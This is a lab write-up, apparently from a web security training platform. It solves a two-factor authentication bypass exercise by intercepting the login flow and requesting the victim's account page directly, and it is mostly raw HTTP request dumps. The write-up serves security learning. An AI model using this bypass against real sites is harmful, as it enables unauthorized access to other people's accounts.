## 2FA simple bypass

This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.

Your credentials: wiener:peter
Victim's credentials carlos:montoya

## Notes

- Possibility to leave a comment on a post
- Exploit server
- /login

## Resume

1. Login with wiener:peter
2. Login with carlos:montoya with intercept on
3. Forward the `/login`
4. Edit the `/login2` with `/my-account?id=carlos`

## Solve 

Login with wiener:peter to get every request made on the login process then log out. Try to log with carlos:montoya with **intercept on**. 

We can forward the first **POST** request on `/login` : 

```
POST /login HTTP/2
Host: 0ad2009504df04be81c0cf53001c00e6.web-security-academy.net
Cookie: session=lgbOOTrs3acbX2GpXcSCrFqOumr6ogt1
Content-Length: 33
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Origin: https://0ad2009504df04be81c0cf53001c00e6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ad2009504df04be81c0cf53001c00e6.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


username=carlos&password=montoya
```

The next request will be the `/login2` request asking for the 2FA code : 

```
GET /login2 HTTP/2
Host: 0ad2009504df04be81c0cf53001c00e6.web-security-academy.net
Cookie: session=lgbOOTrs3acbX2GpXcSCrFqOumr6ogt1
Content-Length: 33
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Origin: https://0ad2009504df04be81c0cf53001c00e6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ad2009504df04be81c0cf53001c00e6.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

To bypass the 2FA we just need to update from `GET /login2` to `GET /my-account?id=carlos` 

```
GET /my-account?id=carlos HTTP/2
Host: 0ad2009504df04be81c0cf53001c00e6.web-security-academy.net
Cookie: session=lgbOOTrs3acbX2GpXcSCrFqOumr6ogt1
Content-Length: 33
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Origin: https://0ad2009504df04be81c0cf53001c00e6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ad2009504df04be81c0cf53001c00e6.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

Once updated we can forward the `/my-account?id=carlos` request to access Carlos's account.